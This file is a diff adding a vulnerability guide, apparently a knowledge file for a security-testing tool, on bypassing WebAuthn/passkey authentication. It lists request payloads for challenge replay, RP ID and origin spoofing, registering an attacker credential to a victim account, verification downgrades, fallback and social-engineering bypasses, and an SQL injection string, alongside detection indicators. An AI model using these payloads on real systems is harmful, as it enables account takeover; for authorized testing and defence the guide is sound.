@@ -1,0 +1,305 @@
+<vulnerability_guide>
+  <title>WEBAUTHN/FIDO2/PASSKEY AUTHENTICATION BYPASS</title>
+
+  <critical>WebAuthn (FIDO2) is considered highly secure, but implementation flaws can completely undermine its protections. Common vulnerabilities include missing origin validation, weak credential ID handling, improper challenge verification, and fallback authentication bypasses. As passkeys become mainstream, WebAuthn vulnerabilities will increasingly enable account takeover.</critical>
+
+  <scope>
+    - Challenge generation and validation flaws
+    - Origin and RP ID verification bypass
+    - Credential ID manipulation
+    - Authenticator attestation weaknesses
+    - User verification bypass
+    - Registration ceremony vulnerabilities
+    - Authentication ceremony exploits
+    - Fallback mechanism abuse
+  </scope>
+
+  <methodology>
+    1. **Map WebAuthn flows**: Document registration and authentication ceremonies
+    2. **Analyze challenge handling**: Test challenge generation, replay, and validation
+    3. **Test origin validation**: Check RP ID and origin verification
+    4. **Examine credential handling**: Test credential ID manipulation
+    5. **Test fallback paths**: Look for password/OTP fallback bypasses
+    6. **Verify attestation**: Check if attestation is properly validated
+  </methodology>
+
+  <advanced_techniques>
+    <challenge_vulnerabilities>
+      Exploit challenge handling flaws:
+      {% raw %}
+      # Challenge replay
+      1. Capture valid challenge from /webauthn/challenge
+      2. Use same challenge in future authentication attempts
+      3. If server doesn't track/expire challenges, replay succeeds
+
+      # Predictable challenges
+      # If challenge is time-based or sequential:
+      challenge = base64(timestamp)
+      challenge = base64(counter++)
+      # Generate valid challenges without server interaction
+
+      # Empty/null challenge
+      POST /webauthn/authenticate
+      {
+        "challenge": "",
+        "challenge": null,
+        "challenge": "AAAAAAAAAAAAAAAAAAAAAA=="  # All zeros
+      }
+
+      # Challenge injection
+      # If challenge is user-controlled:
+      POST /webauthn/start
+      {"username": "victim", "challenge": "attacker-controlled"}
+
+      # Cross-session challenge
+      # Use challenge from session A in session B
+      {% endraw %}
+    </challenge_vulnerabilities>
+
+    <origin_rp_bypass>
+      Bypass origin and relying party validation:
+      {% raw %}
+      # RP ID manipulation
+      # Valid: example.com
+      # Test:
+      {
+        "rpId": "example.com.attacker.com",  # Subdomain of attacker
+        "rpId": "attacker.com",              # Different domain
+        "rpId": "EXAMPLE.COM",               # Case sensitivity
+        "rpId": "",                          # Empty RP ID
+        "rpId": null                         # Null RP ID
+      }
+
+      # Origin mismatch
+      # Credential created on: https://example.com
+      # Authentication from: https://sub.example.com
+      # Or: http://example.com (scheme change)
+
+      # Client data origin spoofing
+      clientDataJSON = {
+        "type": "webauthn.get",
+        "challenge": "...",
+        "origin": "https://example.com",  # Can attacker control this?
+        "crossOrigin": false
+      }
+
+      # Missing origin validation in backend
+      # Server trusts clientDataJSON without verifying origin matches request
+      {% endraw %}
+    </origin_rp_bypass>
+
+    <credential_id_manipulation>
+      Exploit credential ID handling:
+      {% raw %}
+      # Credential ID enumeration
+      # If server reveals valid credential IDs:
+      POST /webauthn/options
+      {"username": "victim"}
+      # Response: {"allowCredentials": [{"id": "abc123"}]}
+
+      # Empty allowCredentials
+      # Forces authenticator to choose any credential
+      POST /webauthn/authenticate
+      {"allowCredentials": []}
+
+      # Credential ID injection
+      # Register attacker's credential with victim's user ID
+      POST /webauthn/register
+      {
+        "userId": "victim-id",          # Victim's internal ID
+        "credentialId": "attacker-cred" # Attacker's credential
+      }
+
+      # Missing credential-user binding verification
+      # Server doesn't verify credential belongs to authenticating user
+      {% endraw %}
+    </credential_id_manipulation>
+
+    <user_verification_bypass>
+      Bypass user verification requirements:
+      {% raw %}
+      # UV flag manipulation
+      # authenticatorData contains UV flag
+      # If backend doesn't check: modify flag in response
+
+      # UV requirement downgrade
+      POST /webauthn/options
+      {"userVerification": "discouraged"}  # Changed from "required"
+
+      # Platform authenticator bypass
+      # If only platform authenticator is intended:
+      {"authenticatorAttachment": "cross-platform"}
+
+      # Resident key bypass
+      {"requireResidentKey": false}  # Changed from true
+      {"residentKey": "discouraged"}
+
+      # Authenticator selection manipulation
+      {
+        "authenticatorSelection": {
+          "userVerification": "discouraged",
+          "authenticatorAttachment": "cross-platform",
+          "requireResidentKey": false
+        }
+      }
+      {% endraw %}
+    </user_verification_bypass>
+
+    <registration_vulnerabilities>
+      Exploit registration ceremony:
+      {% raw %}
+      # Self-registration for existing user
+      # If registration doesn't verify user ownership:
+      POST /webauthn/register/start
+      {"username": "victim"}
+      # Then complete registration with attacker's authenticator
+
+      # Attestation bypass
+      # Server accepts "none" attestation when it should require hardware
+      {
+        "attestation": "none",         # No verification
+        "attestation": "indirect",     # Weaker than direct
+      }
+
+      # Attestation format confusion
+      # Send unexpected format, server may skip validation
+      "attestationObject": {
+        "fmt": "unknown-format",
+        "attStmt": {}
+      }
+
+      # AAGUID manipulation
+      # Claim to be a different authenticator model
+      "aaguid": "00000000-0000-0000-0000-000000000000"
+
+      # Counter manipulation
+      # Set counter to 0 or max value
+      "signCount": 0
+      "signCount": 4294967295
+      {% endraw %}
+    </registration_vulnerabilities>
+
+    <authentication_vulnerabilities>
+      Exploit authentication ceremony:
+      {% raw %}
+      # Signature validation bypass
+      # If signature isn't properly verified:
+      {
+        "signature": "AAAA",           # Invalid signature
+        "signature": "",               # Empty signature
+        "signature": null              # Null signature
+      }
+
+      # Counter bypass
+      # If sign counter isn't checked:
+      # Use old counter value (indicates cloned authenticator)
+      "signCount": 1  # Lower than last successful auth
+
+      # clientDataJSON manipulation
+      {
+        "type": "webauthn.create",     # Wrong type (should be .get)
+        "challenge": "modified",       # Different challenge
+        "origin": "https://attacker.com"
+      }
+
+      # authenticatorData manipulation
+      # Modify flags, counter, or extensions
+      # If server doesn't fully validate authenticatorData
+      {% endraw %}
+    </authentication_vulnerabilities>
+
+    <fallback_bypass>
+      Exploit fallback authentication:
+      {% raw %}
+      # Password fallback
+      # If WebAuthn fails, system offers password login
+      POST /webauthn/authenticate
+      {"error": true}  # Force failure
+      # Then use password attack vectors
+
+      # OTP/Email fallback
+      POST /auth/recover
+      {"method": "email"}
+      # Bypass WebAuthn entirely via recovery flow
+
+      # Support/admin bypass
+      # Contact support to disable WebAuthn
+      # Social engineering to remove MFA
+
+      # Session management bypass
+      # If session cookie survives WebAuthn requirement change:
+      1. Authenticate before WebAuthn required
+      2. Keep session active
+      3. Access account without WebAuthn
+
+      # Enrollment bypass
+      # Skip WebAuthn enrollment during onboarding
+      POST /user/settings
+      {"webauthn_enabled": false}
+      {% endraw %}
+    </fallback_bypass>
+
+    <implementation_flaws>
+      Common implementation mistakes:
+      {% raw %}
+      # Missing clientDataJSON validation
+      # Server trusts challenge in response without matching to sent challenge
+
+      # Type confusion
+      # Accepting "webauthn.create" response during authentication
+
+      # No RP ID validation
+      # Accepting credentials from different relying party
+
+      # Weak randomness
+      # Challenge generated with predictable PRNG
+
+      # SQL injection in credential lookup
+      GET /webauthn/credentials?id=' OR '1'='1
+
+      # Race condition
+      # Register credential while authentication is in progress
+
+      # Error oracle
+      # Different errors for valid vs invalid credential IDs
+      "Credential not found" vs "Invalid signature"
+      {% endraw %}
+    </implementation_flaws>
+  </advanced_techniques>
+
+  <validation>
+    - Bypass WebAuthn authentication using implementation flaw
+    - Register attacker credential for victim account
+    - Exploit fallback mechanism to avoid WebAuthn
+    - Demonstrate challenge replay or prediction
+    - Access account without proper authenticator
+  </validation>
+
+  <false_positives>
+    - Intended recovery mechanisms (with proper verification)
+    - Test/demo accounts without full WebAuthn enforcement
+    - Gradual rollout where some users aren't required to use WebAuthn
+    - Admin override features (with proper audit trail)
+  </false_positives>
+
+  <detection_indicators>
+    - Authentication attempts with invalid/replayed challenges
+    - Credential registration for users without verification
+    - Fallback authentication after WebAuthn failure
+    - clientDataJSON with mismatched origin
+    - Unusual authenticator attestation formats
+  </detection_indicators>
+
+  <pro_tips>
+    - WebAuthn library implementations vary in strictness
+    - Check if server validates ALL fields in authenticator response
+    - Fallback mechanisms are often the weakest link
+    - Test both registration AND authentication ceremonies
+    - Origin validation is frequently misconfigured
+    - Challenge should be cryptographically random, single-use, and time-limited
+    - AAGUID can reveal authenticator type - useful for reconnaissance
+    - Cross-platform authenticators may have different trust levels
+  </pro_tips>
+
+  <remember>WebAuthn is only as secure as its implementation. The cryptographic primitives are sound, but improper challenge handling, missing origin validation, or weak fallback mechanisms can make the entire system bypassable.</remember>
+</vulnerability_guide>
